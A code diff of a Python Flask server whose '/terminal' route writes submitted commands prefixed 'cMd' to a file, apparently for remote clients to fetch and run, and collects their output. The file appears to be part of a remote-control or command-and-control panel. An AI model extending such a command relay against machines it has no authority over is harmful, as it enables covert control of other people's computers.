@@ -1,7 +1,6 @@
 import os
 from time import time
-from flask import Flask, render_template, request, redirect, jsonify, Response, after_this_request
-import asyncio
+from flask import Flask, render_template, request, redirect, jsonify, Response, after_this_request, send_file
 from datetime import datetime
 import base64
 import json
@@ -502,46 +501,29 @@ def control():
         data1 = control_data
         control_data = {}      
         return jsonify(data1)
-@app.route("/terminal", methods=["GET", "POST"])
+@app.route("/terminal",methods=["GET", "POST"])
 def terminal():
     global output
     if request.method == "GET":
-        audios = os.listdir(os.path.join(STATIC_FOLDER, "sounds"))
-        images = os.listdir(os.path.join(STATIC_FOLDER, "images"))
-        videos = os.listdir(os.path.join(STATIC_FOLDER, "videos"))
-        return render_template("terminal.html", user=selected_user, audios=audios, videos=videos, images=images)
-    
+        audios = os.listdir(os.path.join(STATIC_FOLDER,"sounds"))
+        images = os.listdir(os.path.join(STATIC_FOLDER,"images"))
+        videos = os.listdir(os.path.join(STATIC_FOLDER,"videos"))
+        return render_template("terminal.html",user=selected_user,audios=audios,videos=videos,images=images)
     elif request.method == "POST":
         cmd = request.get_json()
-        print(cmd)
-        
+        print(cmd)	
         if "input" in cmd:		
             if cmd["input"]:
                 output = None
-                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
+                with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
                     cmd1 = cmd["input"]
                     file.write(f"cMd {cmd1}")
-                
-                timeout = 5
-                elapsed_time = 0
-                check_interval = 0.4
-                
-                while output is None:
-                    if elapsed_time >= timeout:
-                        return jsonify({"error": "Timeout waiting for data"}), 408
-                    await asyncio.sleep(check_interval)
-                    elapsed_time += check_interval
-                
-                result = output
-                output = None
-                return result
-        
+
         elif "output" in cmd:
             if cmd["output"]:
-                output = cmd["output"]
-    
+                output = cmd["output"]    
+            
     return "done"
-
     
 @app.route("/get-output",methods=["GET","POST"])
 def get_output():
